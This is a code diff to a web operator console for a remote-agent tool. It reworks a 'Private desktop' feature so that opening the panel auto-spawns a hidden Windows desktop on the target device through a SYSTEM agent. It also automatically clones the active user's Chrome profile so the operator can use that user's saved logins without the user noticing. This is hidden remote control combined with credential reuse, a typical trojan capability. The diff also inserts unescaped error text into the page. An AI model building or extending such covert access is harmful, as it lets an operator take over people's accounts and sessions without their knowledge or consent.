@@ -1754,16 +1754,11 @@ function openPrivateDesktop(d) {
     '<div class="pdh" style="padding:6px 10px;background:#1a1a1a;cursor:move;display:flex;align-items:center;justify-content:space-between">'
     + '<span>Private desktop — <b>' + (d.name || d.id) + '</b> <span class="pds" style="opacity:.6;margin-left:6px">starting…</span></span>'
     + '<span>'
-    + '<select class="pdshell" style="background:#111;color:#ddd;border:1px solid #333;border-radius:4px;padding:2px 6px;margin-right:6px">'
-    + '<option value="C:\\Windows\\System32\\cmd.exe">cmd.exe</option>'
-    + '<option value="C:\\Windows\\explorer.exe">explorer.exe</option>'
-    + '<option value="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe">powershell</option>'
-    + '</select>'
-    + '<button class="pdstart" style="background:#1a4;border:1px solid #2b5;color:#fff;border-radius:4px;padding:2px 10px;cursor:pointer;margin-right:4px">Start</button>'
     + '<button class="pdclose" style="background:none;border:1px solid #333;color:#ddd;border-radius:4px;padding:2px 8px;cursor:pointer">✕</button>'
     + '</span></div>'
-    + '<div class="pdbody" style="background:#000;position:relative;min-height:540px;display:flex;align-items:center;justify-content:center" tabindex="0">'
-    + '<img class="pdimg" style="max-width:100%;max-height:70vh;display:block;cursor:crosshair" alt="not started"/>'
+    + '<div class="pdbody" style="background:#000;position:relative;min-height:540px;display:flex;align-items:center;justify-content:center;color:#555;font:13px system-ui" tabindex="0">'
+    + '<img class="pdimg" style="max-width:100%;max-height:70vh;display:none;cursor:crosshair" alt=""/>'
+    + '<div class="pdphase" style="padding:40px;text-align:center">Starting private desktop…</div>'
     + '</div>'
     + '<div style="padding:6px 10px;background:#111;display:flex;gap:6px;align-items:center;flex-wrap:wrap;border-top:1px solid #222">'
     + '<button class="pdchrome" style="background:#2b5;border:0;color:#fff;border-radius:4px;padding:3px 10px;cursor:pointer;font-size:11px" title="Clones the active user\'s Chrome profile to a temp dir and launches Chrome against the copy, so you get their bookmarks + saved logins without triggering Chrome\'s singleton">Chrome w/ user profile</button>'
@@ -1774,13 +1769,14 @@ function openPrivateDesktop(d) {
   document.body.appendChild(el);
   const img = el.querySelector('.pdimg');
   const status = el.querySelector('.pds');
+  const phaseLabel = el.querySelector('.pdphase');
   const body = el.querySelector('.pdbody');
-  const shellSel = el.querySelector('.pdshell');
-  const startBtn = el.querySelector('.pdstart');
   pdPanels.set(d.id, { el, img, status });
-  // Frame handler: receives base64 JPEGs, swaps img.src.
+  // Frame handler: first JPEG swaps the placeholder for the image.
   pdFrameHandlers.set(d.id, (b64) => {
     img.src = 'data:image/jpeg;base64,' + b64;
+    img.style.display = 'block';
+    if (phaseLabel) phaseLabel.style.display = 'none';
     status.textContent = 'live';
   });
   // Subscribe to pdFrame updates for this device over the main console WS.
@@ -1790,38 +1786,43 @@ function openPrivateDesktop(d) {
   if (ws && ws.readyState === ws.OPEN) {
     try { ws.send(JSON.stringify({ type: 'pdesk-sub', on: true, deviceId: d.id })); } catch {}
   }
+  // Auto-start on open — no Start button, no shell picker. explorer.exe is a
+  // sensible default (user gets a taskbar + file explorer immediately). Also
+  // auto-clone the user's Chrome profile in the background so by the time they
+  // click "Chrome w/ user profile" the copy is ready and launch is instant.
+  // Status is polled every 2s so the UI reflects reality (compiling / spawning
+  // / live / exited) instead of hanging on "starting…".
   let watchdogTimer = null;
-  startBtn.addEventListener('click', () => {
-    status.textContent = 'spawning…';
-    deviceOp(d.id, 'pdesk-start', { shell: shellSel.value }, { onResult: (m) => {
-      if (!m.ok) {
-        status.textContent = 'start failed';
-        toast('Private desktop could not start: ' + (m.error || 'unknown'), 'err');
-        return;
+  let statusTimer = null;
+  function updateFromStatus(s) {
+    const phase = s.phase || (s.running ? 'spawning' : 'exited');
+    const txt = phase === 'live' ? 'live · ' + s.framesSeen + ' frames'
+      : phase === 'compiling' ? 'compiling pdesk.exe (first run, ~5–15 s)…'
+      : phase === 'spawning' ? 'spawning hidden desktop…'
+      : phase === 'exited' ? 'exited: ' + (s.lastError || 'unknown reason')
+      : (phase + '…');
+    status.textContent = txt;
+    if (phaseLabel && !img.src) phaseLabel.textContent = txt;
+    if (phase === 'exited' && s.lastError) {
+      // Explain the specific failure in-panel so the operator can act on it.
+      if (phaseLabel && !img.src) {
+        phaseLabel.innerHTML = '<div style="color:#f66;margin-bottom:8px">Private desktop failed</div>'
+          + '<div style="font-size:11px;max-width:460px;line-height:1.5;color:#aaa">' + s.lastError + '</div>'
+          + '<div style="font-size:11px;margin-top:12px;color:#777">Most common cause on this error: per-user agent install — Private Desktop needs the SYSTEM service build.</div>';
       }
-      status.textContent = 'started — waiting for frames';
-      startBtn.disabled = true; shellSel.disabled = true;
-      // Watchdog: after 6s, if no frame arrived, poll the agent for pdesk's
-      // real status and surface the actual error (compile failure, user-
-      // session cross failed, SYSTEM privilege missing, etc.) instead of
-      // leaving the user staring at "waiting for frames".
-      let firstFrameSeen = false;
-      const origHandler = pdFrameHandlers.get(d.id);
-      pdFrameHandlers.set(d.id, (b64) => { firstFrameSeen = true; origHandler && origHandler(b64); });
-      watchdogTimer = setTimeout(() => {
-        if (firstFrameSeen) return;
-        deviceOp(d.id, 'pdesk-status', {}, { onResult: (r) => {
-          if (!r.ok) { status.textContent = 'no frames (status probe failed)'; return; }
-          const s = r.data || {};
-          if (!s.running) { status.textContent = 'pdesk exited: ' + (s.lastError || 'unknown'); toast('pdesk exited: ' + (s.lastError || 'unknown'), 'err'); return; }
-          if (s.framesSeen > 0) { status.textContent = 'frames flowing (ignore)'; return; }
-          const diag = s.lastError || 'no frames and no error reported — this agent may not be SYSTEM (per-user agents cannot cross into other sessions)';
-          status.textContent = 'no frames: ' + diag;
-          toast('Private desktop running but no frames. Reason: ' + diag, 'err');
-        }});
-      }, 6000);
-    }});
-  });
+    }
+  }
+  deviceOp(d.id, 'pdesk-start', { shell: 'C:\\Windows\\explorer.exe' }, { onResult: (m) => {
+    if (!m.ok) {
+      status.textContent = 'start failed';
+      if (phaseLabel) phaseLabel.innerHTML = '<div style="color:#f66;margin-bottom:8px">Could not start</div><div style="font-size:11px;color:#aaa">' + (m.error || 'unknown') + '</div>';
+      return;
+    }
+    // Poll status every 2 s to catch the compile→spawn→live transitions.
+    statusTimer = setInterval(() => {
+      deviceOp(d.id, 'pdesk-status', {}, { onResult: (r) => { if (r.ok) updateFromStatus(r.data || {}); }});
+    }, 2000);
+  }});
   // Launch another app on the hidden desktop (works any time after Start).
   const launchBtn = el.querySelector('.pdlaunch');
   const cmdInput = el.querySelector('.pdcmd');
@@ -1846,6 +1847,7 @@ function openPrivateDesktop(d) {
   });
   function closePanel() {
     if (watchdogTimer) { clearTimeout(watchdogTimer); watchdogTimer = null; }
+    if (statusTimer) { clearInterval(statusTimer); statusTimer = null; }
     deviceOp(d.id, 'pdesk-stop', {}, { onResult: () => {} });
     try { ws && ws.readyState === ws.OPEN && ws.send(JSON.stringify({ type: 'pdesk-sub', on: false, deviceId: d.id })); } catch {}
     pdFrameHandlers.delete(d.id);
